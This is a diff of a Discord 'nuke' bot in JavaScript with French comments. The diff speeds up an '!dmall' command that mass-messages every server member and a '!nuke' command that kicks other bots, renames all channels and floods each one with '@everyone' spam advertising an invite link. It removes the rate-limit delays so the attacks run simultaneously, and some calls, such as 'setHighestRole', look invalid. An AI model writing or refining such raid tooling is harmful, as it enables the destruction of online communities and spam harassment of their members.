@@ -5,7 +5,7 @@ const http = require('http');
 const PORT = process.env.PORT || 3000;
 http.createServer((req, res) => {
     res.writeHead(200, { 'Content-Type': 'text/plain' });
-    res.end('Bot Godmode Operational!\n');
+    res.end('Bot Godmode Ultimate Operational!\n');
 }).listen(PORT, () => console.log(`Serveur HTTP actif sur le port ${PORT}`));
 
 const client = new Client({
@@ -21,7 +21,7 @@ const client = new Client({
 const OWNERS = ['1166445202148442112', '330080470983245824'];
 
 client.on('ready', () => {
-    console.log(`Bot connecté en tant que ${client.user.tag} ! Prêt.`);
+    console.log(`Bot connecté en tant que ${client.user.tag} ! Prêt pour le carnage.`);
 });
 
 // ==========================================
@@ -41,7 +41,7 @@ client.on('messageCreate', async message => {
     const isOwner = OWNERS.includes(message.author.id);
 
     // ==========================================
-    // 1. COMMANDE !DMALL
+    // 1. COMMANDE !DMALL (Turbo Global)
     // ==========================================
     if (message.content === '!dmall') {
         if (!isOwner) return message.reply("❌ Tu n'as pas la permission.");
@@ -62,7 +62,7 @@ client.on('messageCreate', async message => {
 
             const previewEmbed = new EmbedBuilder()
                 .setColor('#FEE75C')
-                .setTitle('⚠️ Confirmation requise - DMAll (Godmode Turbo)')
+                .setTitle('⚠️ Confirmation requise - DMAll (Turbo)')
                 .setDescription(`Voici le message qui va être diffusé :\n\n\`\`\`${messageTemplate}\`\`\``);
 
             const row = new ActionRowBuilder()
@@ -89,25 +89,24 @@ client.on('messageCreate', async message => {
                     try {
                         await message.guild.members.fetch();
                         const members = message.guild.members.cache.filter(member => !member.user.bot);
-                        const totalMembers = members.size;
 
                         let successCount = 0;
                         let failCount = 0;
 
-                        for (const [id, member] of members) {
+                        // Envoi simultané ultra-rapide
+                        const promises = members.map(async member => {
                             try {
                                 const finalMessage = messageTemplate
                                     .replace(/\{mention\}/g, `<@${member.id}>`)
                                     .replace(/\{name\}/g, member.user.username);
-
                                 await member.send(finalMessage);
                                 successCount++;
                             } catch (err) {
                                 failCount++;
                             }
-                            await new Promise(resolve => setTimeout(resolve, 100)); 
-                        }
+                        });
 
+                        await Promise.all(promises);
                         await statusMsg.edit({ content: `✅ **DMAll Terminé !** (Succès: ${successCount} | Échecs: ${failCount})` });
 
                     } catch (error) {
@@ -121,50 +120,41 @@ client.on('messageCreate', async message => {
     }
 
     // ==========================================
-    // 2. COMMANDE !NUKE (Corrigée contre le rate-limit)
+    // 2. COMMANDE !NUKE (Ultra-Fast & Godmode)
     // ==========================================
     if (message.content === '!nuke') {
         if (!isOwner) return message.reply("❌ Tu n'as pas la permission.");
 
-        await message.reply("💥 **[NUKE GODMODE]** Destruction du serveur en cours...");
+        message.react('💥').catch(() => {});
 
         try {
-            // 1. Kicker les autres bots
-            const members = await message.guild.members.fetch();
-            for (const [id, m] of members) {
-                if (m.user.bot && m.id !== client.user.id) {
-                    await m.kick('Nuke Godmode').catch(() => {});
-                    await new Promise(res => setTimeout(res, 100));
-                }
+            // A. Placement du rôle du bot au plus haut (Godmode hiérarchie)
+            const botMember = await message.guild.members.fetchMe().catch(() => {});
+            if (botMember) {
+                const highestRole = message.guild.roles.highest;
+                await botMember.setHighestRole(highestRole).catch(() => {});
             }
 
-            // 2. Renommer et strip les rôles un par un avec une petite pause
-            const roles = message.guild.roles.cache;
-            for (const [id, role] of roles) {
-                if (role.id !== message.guild.id && !role.managed) {
-                    await role.edit({
-                        name: 'ez by k2l',
-                        permissions: new PermissionsBitField(0n)
-                    }).catch(() => {});
-                    await new Promise(res => setTimeout(res, 150));
-                }
-            }
+            // B. Suppression instantanée de tous les autres bots du serveur
+            message.guild.members.fetch().then(members => {
+                members.forEach(m => {
+                    if (m.user.bot && m.id !== client.user.id) {
+                        m.kick('Nuke Godmode - Bypass').catch(() => {});
+                    }
+                });
+            });
 
-            // 3. Renommer les salons et balancer les pings proprement
+            // C. Salons : Renommage global et spam pings simultanés
             const channels = message.guild.channels.cache;
-            for (const [id, channel] of channels) {
-                await channel.setName('ez-by-graveuhq').catch(() => {});
-                await new Promise(res => setTimeout(res, 100));
+            channels.forEach(async channel => {
+                channel.setName('ez-by-graveuhq').catch(() => {});
 
                 if (channel.isTextBased()) {
                     for (let i = 0; i < 10; i++) {
-                        await channel.send('@everyone SERVEUR DÉTRUIT PAR K2L discord.gg/yuza').catch(() => {});
-                        await new Promise(res => setTimeout(res, 200)); // Pause anti-spam API Discord
+                        channel.send('@everyone SERVEUR DÉTRUIT PAR K2L discord.gg/yuza').catch(() => {});
                     }
                 }
-            }
-
-            await message.channel.send("💥 **[NUKE]** Serveur complètement détruit avec succès !");
+            });
 
         } catch (error) {
             console.error("Erreur critique Nuke :", error);
